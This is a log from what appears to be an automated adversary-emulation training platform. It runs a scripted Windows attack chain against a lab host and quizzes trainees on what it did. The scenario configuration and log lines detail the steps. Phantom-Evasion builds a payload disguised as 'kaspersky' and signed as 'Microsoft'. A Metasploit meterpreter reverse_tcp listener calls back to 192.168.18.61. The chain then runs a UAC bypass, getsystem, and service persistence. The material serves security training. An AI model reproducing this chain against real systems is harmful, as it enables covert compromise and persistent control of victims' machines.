2020-04-04 23:17:17,647- attack-thread - INFO - Property Not Found
2020-04-04 23:17:17,757- attack-thread - INFO - ....................Parsing Scenario....................
2020-04-04 23:17:17,763- attack-thread - INFO - [{'TA24_T1345_P1': {'name': 'payload generation', 'tactic': 'Build_Capabilities', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'phantom-evasion', 'command-prefix': 'python3', 'folder-path': '/home/Tools/Phantom-Evasion/', 'absolute-path': '/home/Tools/Phantom-Evasion/phantom-evasion.py', 'input': [{'Please insert option': '1'}, {'Please insert option': '2'}, {'Please insert option': '2'}, {'Please insert payload number': '3'}, {'Press Enter to continue': ''}, {'Please insert LHOST': 'LHOST_$ref'}, {'Please insert LPORT': 'LPORT_$ref'}, {'Please insert output filename': 'PAYLOAD_NAME_$ref'}, {'Add multiple processes behaviour': 'n'}, {'Strip executable\\?': 'y'}, {'Sign executable\\?': 'y'}, {'use already existing certificate': 'y'}, {'Select a Certificate': '1'}, {'Insert sign software description': 'Microsoft'}, {'Press Enter to continue': ''}, {'Please insert option': '0'}], 'options': {'LHOST_$ref': 'LHOST_$ref', 'LPORT_$ref': 'LPORT_$ref', 'PAYLOAD_NAME_$ref': 'PAYLOAD_NAME_$ref'}}}, {'TA08_T1105_P1': {'name': 'copy_file_to_windows', 'tactic': 'Lateral_Movement', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA01_T1091_P1': {'name': 'Payload_listener', 'tactic': 'Initial_Access', 'try_count': 3, 'spawn_seperate_session': True, 'type': 'listener', 'service': 'None', 'tool': 'metasploit', 'exploit': 'multi/handler', 'payload': 'windows/x64/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref->Build_Capabilities'}, 'separate-thread': 'yes'}}, {'TA02_T1059_P1': {'name': 'execute_file_on_windows', 'tactic': 'Execution', 'try_count': 1, 'platform': 'windows_10_1511', 'tool': 'ansible', 'command-prefix': None, 'folder-path': None, 'absolute-path': None}}, {'TA04_T1088_P1': {'name': 'bypassuac_sluihijack', 'tactic': 'Privilege_Escalation', 'try_count': 3, 'spawn_seperate_session': False, 'tool': 'metasploit', 'exploit': 'windows/local/bypassuac_sluihijack', 'payload': 'windows/meterpreter/reverse_tcp', 'options': {'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}, {'TA04_T1134_P1': {'name': 'getsystem', 'tactic': 'Privilege_Escalation', 'try_count': 1, 'spawn_seperate_session': False, 'type': 'command', 'service': 'None', 'tool': 'meterpreter', 'command': 'getsystem'}}, {'TA03_T1050_P1': {'name': 'persistence_service', 'tactic': 'Persistence', 'try_count': 2, 'spawn_seperate_session': True, 'tool': 'metasploit', 'exploit': 'windows/local/persistence_service', 'options': {'REMOTE_EXE_NAME': 'REMOTE_EXE_NAME_$ref', 'SERVICE_NAME': 'SERVICE_NAME_$ref', 'REMOTE_EXE_PATH': 'REMOTE_EXE_PATH_$ref', 'LHOST': 'LHOST_$ref', 'LPORT': 'LPORT_$ref', 'SESSION': 'SESSION_$ref'}}}]
2020-04-04 23:17:17,764- attack-thread - INFO - *****************************Check tools status*****************************
2020-04-04 23:17:17,764- attack-thread - INFO - ['phantom-evasion', 'ansible', 'metasploit', 'ansible', 'metasploit', 'meterpreter', 'metasploit']
2020-04-04 23:17:17,764- attack-thread - INFO - /home/Tools/Phantom-Evasion/phantom-evasion.py = [32mTrue[0m
2020-04-04 23:17:17,764- attack-thread - INFO - ansible = [32mTrue[0m
2020-04-04 23:17:17,765- attack-thread - INFO - msfconsole = [32mTrue[0m
2020-04-04 23:17:17,765- attack-thread - INFO - ansible = [32mTrue[0m
2020-04-04 23:17:17,765- attack-thread - INFO - msfconsole = [32mTrue[0m
2020-04-04 23:17:17,766- attack-thread - INFO - meterpreter = [33mDEPENDS_ON_METASPLOIT[0m
2020-04-04 23:17:17,766- attack-thread - INFO - msfconsole = [32mTrue[0m
2020-04-04 23:17:17,766- attack-thread - INFO - ************************Updating Session Tactics**********************
2020-04-04 23:17:17,784- attack-thread - INFO - Tacics list has been appended in list has been appended in evaluation
2020-04-04 23:17:17,804- attack-thread - INFO - ....................Spawning Phantom Evasion....................
2020-04-04 23:17:17,804- attack-thread - INFO - Reason: payload generation
2020-04-04 23:17:28,260- attack-thread - INFO - Please insert option: 1
2020-04-04 23:17:28,919- attack-thread - INFO - Please insert option: 2
2020-04-04 23:17:29,476- attack-thread - INFO - Please insert option: 2
2020-04-04 23:17:31,037- attack-thread - INFO - Please insert payload number: 3
2020-04-04 23:17:31,193- attack-thread - INFO - Press Enter to continue: 
2020-04-04 23:17:31,350- attack-thread - INFO - Please insert LHOST: 192.168.18.61
2020-04-04 23:17:31,402- attack-thread - INFO - Please insert LPORT: 14349
2020-04-04 23:17:31,454- attack-thread - INFO - Please insert output filename: kaspersky
2020-04-04 23:17:32,006- attack-thread - INFO - Add multiple processes behaviour: n
2020-04-04 23:17:33,270- attack-thread - INFO - Strip executable\?: y
2020-04-04 23:17:34,831- attack-thread - INFO - Sign executable\?: y
2020-04-04 23:17:34,883- attack-thread - INFO - use already existing certificate: y
2020-04-04 23:17:34,936- attack-thread - INFO - Select a Certificate: 1
2020-04-04 23:17:34,989- attack-thread - INFO - Insert sign software description: Microsoft
2020-04-04 23:17:36,281- attack-thread - INFO - Press Enter to continue: 
2020-04-04 23:17:36,739- attack-thread - INFO - Please insert option: 0
2020-04-04 23:17:36,740- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:17:36,741- attack-thread - WARNING - Mitre/Challenges/Build_Capabilities.json  not found
2020-04-04 23:17:36,741- attack-thread - INFO - ******[Scenario-ID: TA24_T1345_P1Tactic: Build_Capabilities executed]******
2020-04-04 23:17:55,968- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:17:55,968- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
2020-04-04 23:17:55,969- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
2020-04-04 23:17:56,014- attack-thread - INFO - No Exceptions Found
2020-04-04 23:17:56,067- attack-thread - INFO - post not needed
2020-04-04 23:17:56,090- attack-thread - INFO - exploit['LHOST'] not needed...
2020-04-04 23:17:56,090- attack-thread - INFO - exploit['LPORT'] not needed...
2020-04-04 23:17:56,125- attack-thread - INFO - cid: 6
2020-04-04 23:17:56,126- attack-thread - INFO - Starting Another Thread
2020-04-04 23:17:56,126- metasploit-thread - INFO - ....................Executing Exploit......................................
2020-04-04 23:17:57,768- metasploit-thread - INFO - {'job_id': 15, 'uuid': 'yxr8vnr3'}
2020-04-04 23:17:57,774- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:00,787- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:01,129- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:01,131- attack-thread - INFO - Appending Generalize questions_answers
2020-04-04 23:18:01,131- attack-thread - INFO - Appending scenario-specific questions_answers
2020-04-04 23:18:01,132- attack-thread - INFO - *****************************Questions*****************************
2020-04-04 23:18:01,132- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
2020-04-04 23:18:01,133- attack-thread - INFO - *****************************Actual Answers*****************************
2020-04-04 23:18:01,134- attack-thread - INFO - ['192.168.18.61', 14349, '%USERPROFILE%\\Downloads\\', 'kaspersky']
2020-04-04 23:18:01,154- attack-thread - INFO - evaluation id:5e88cfc972a7eb1a41619ddd
2020-04-04 23:18:01,155- attack-thread - INFO - ************************Updating Evaluation form for user**********************
2020-04-04 23:18:01,183- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
2020-04-04 23:18:01,183- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
2020-04-04 23:18:01,205- attack-thread - INFO - command is kaspersky.exe
2020-04-04 23:18:03,818- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:05,049- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:05,049- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
2020-04-04 23:18:05,049- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
2020-04-04 23:18:05,093- attack-thread - INFO - ....................Executing Meterpreter Command...............................
2020-04-04 23:18:05,093- attack-thread - CRITICAL - Exception Occured somewhere!!
2020-04-04 23:18:05,093- attack-thread - INFO - ....................Going 1 step back........................
2020-04-04 23:18:05,116- attack-thread - INFO - command is kaspersky.exe
2020-04-04 23:18:06,851- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:08,099- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:08,099- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
2020-04-04 23:18:08,099- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
2020-04-04 23:18:08,371- attack-thread - INFO - ....................Executing Meterpreter Command...............................
2020-04-04 23:18:08,371- attack-thread - CRITICAL - Exception Occured somewhere!!
2020-04-04 23:18:08,372- attack-thread - INFO - ....................Going 2 step back........................
2020-04-04 23:18:08,514- attack-thread - INFO - Exception Successfully Raised
2020-04-04 23:18:08,515- attack-thread - INFO - Exception caught
2020-04-04 23:18:08,515- attack-thread - INFO - No Exceptions Found
2020-04-04 23:18:08,561- attack-thread - INFO - post not needed
2020-04-04 23:18:08,587- attack-thread - INFO - exploit['LHOST'] not needed...
2020-04-04 23:18:08,588- attack-thread - INFO - exploit['LPORT'] not needed...
2020-04-04 23:18:08,605- attack-thread - INFO - cid: 7
2020-04-04 23:18:08,605- attack-thread - INFO - Starting Another Thread
2020-04-04 23:18:08,605- metasploit-thread - INFO - ....................Executing Exploit......................................
2020-04-04 23:18:10,223- metasploit-thread - INFO - {'job_id': 16, 'uuid': 'bttosyac'}
2020-04-04 23:18:10,229- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:13,242- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:13,611- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:13,612- attack-thread - INFO - Appending Generalize questions_answers
2020-04-04 23:18:13,612- attack-thread - INFO - Appending scenario-specific questions_answers
2020-04-04 23:18:13,613- attack-thread - INFO - *****************************Questions*****************************
2020-04-04 23:18:13,613- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
2020-04-04 23:18:13,614- attack-thread - INFO - *****************************Actual Answers*****************************
2020-04-04 23:18:13,614- attack-thread - INFO - ['192.168.18.61', 14349, '%USERPROFILE%\\Downloads\\', 'kaspersky']
2020-04-04 23:18:13,634- attack-thread - INFO - evaluation id:5e88cfc972a7eb1a41619ddd
2020-04-04 23:18:13,634- attack-thread - INFO - ************************Updating Evaluation form for user**********************
2020-04-04 23:18:13,653- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
2020-04-04 23:18:13,654- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
2020-04-04 23:18:13,684- attack-thread - INFO - command is kaspersky.exe
2020-04-04 23:18:16,256- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:17,475- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:17,475- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
2020-04-04 23:18:17,475- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
2020-04-04 23:18:17,494- attack-thread - INFO - ....................Executing Meterpreter Command...............................
2020-04-04 23:18:17,495- attack-thread - CRITICAL - Exception Occured somewhere!!
2020-04-04 23:18:17,496- attack-thread - INFO - ....................Going 3 step back........................
2020-04-04 23:18:17,543- attack-thread - INFO - Exception Successfully Raised
2020-04-04 23:18:17,544- attack-thread - INFO - Exception caught
2020-04-04 23:18:20,579- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:20,579- attack-thread - WARNING - Mitre/Challenges/Lateral_Movement.json  not found
2020-04-04 23:18:20,580- attack-thread - INFO - ******[Scenario-ID: TA08_T1105_P1Tactic: Lateral_Movement executed]******
2020-04-04 23:18:20,603- attack-thread - INFO - No Exceptions Found
2020-04-04 23:18:20,625- attack-thread - INFO - post not needed
2020-04-04 23:18:20,643- attack-thread - INFO - exploit['LHOST'] not needed...
2020-04-04 23:18:20,643- attack-thread - INFO - exploit['LPORT'] not needed...
2020-04-04 23:18:20,660- attack-thread - INFO - cid: 8
2020-04-04 23:18:20,661- attack-thread - INFO - Starting Another Thread
2020-04-04 23:18:20,661- metasploit-thread - INFO - ....................Executing Exploit......................................
2020-04-04 23:18:22,288- metasploit-thread - INFO - {'job_id': 17, 'uuid': 'qw4cvgbl'}
2020-04-04 23:18:22,294- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:25,313- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:25,665- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:25,666- attack-thread - INFO - Appending Generalize questions_answers
2020-04-04 23:18:25,666- attack-thread - INFO - Appending scenario-specific questions_answers
2020-04-04 23:18:25,666- attack-thread - INFO - *****************************Questions*****************************
2020-04-04 23:18:25,666- attack-thread - INFO - {'General_question_1': {' What is Ip address of Attacker?': 'LHOST_$ref'}, 'General_question_4': {" Write Attacker's port of listening?": 'LPORT_$ref'}, 'Question_1': {' Write the path of directory in which payload is present? ': 'generated_payload_destination_file_path_$ref'}, 'Question_2': {' What is the name of malicious software or service? ': 'PAYLOAD_NAME_$ref'}}
2020-04-04 23:18:25,666- attack-thread - INFO - *****************************Actual Answers*****************************
2020-04-04 23:18:25,666- attack-thread - INFO - ['192.168.18.61', 14349, '%USERPROFILE%\\Downloads\\', 'kaspersky']
2020-04-04 23:18:25,965- attack-thread - INFO - evaluation id:5e88cfc972a7eb1a41619ddd
2020-04-04 23:18:25,965- attack-thread - INFO - ************************Updating Evaluation form for user**********************
2020-04-04 23:18:25,994- attack-thread - INFO - TA01_T1091_P1 has been appended in evaluation
2020-04-04 23:18:25,995- attack-thread - INFO - ******[Scenario-ID: TA01_T1091_P1Tactic: Initial_Access executed]******
2020-04-04 23:18:26,028- attack-thread - INFO - command is kaspersky.exe
2020-04-04 23:18:28,336- metasploit-thread - INFO - Meterpreter Sessions list empty: {}
2020-04-04 23:18:29,827- attack-thread - INFO - **************************Exploring Evaluation**********************
2020-04-04 23:18:29,828- attack-thread - WARNING - Mitre/Challenges/Execution.json  not found
2020-04-04 23:18:29,828- attack-thread - INFO - ******[Scenario-ID: TA02_T1059_P1Tactic: Execution executed]******
2020-04-04 23:18:30,159- attack-thread - INFO - ....................Executing Meterpreter Command...............................
2020-04-04 23:18:30,160- attack-thread - CRITICAL - Exception Occured somewhere!!
2020-04-04 23:18:30,160- attack-thread - INFO - ....................Going 4 step back........................
2020-04-04 23:18:30,203- attack-thread - INFO - Exception Successfully Raised
2020-04-04 23:18:30,204- attack-thread - INFO - Exception caught
2020-04-04 23:18:30,307- attack-thread - INFO - ....................Spawning Phantom Evasion....................
2020-04-04 23:18:30,307- attack-thread - INFO - Reason: payload generation
2020-04-04 23:18:30,308- attack-thread - INFO - ['LPORT'] option not needed...
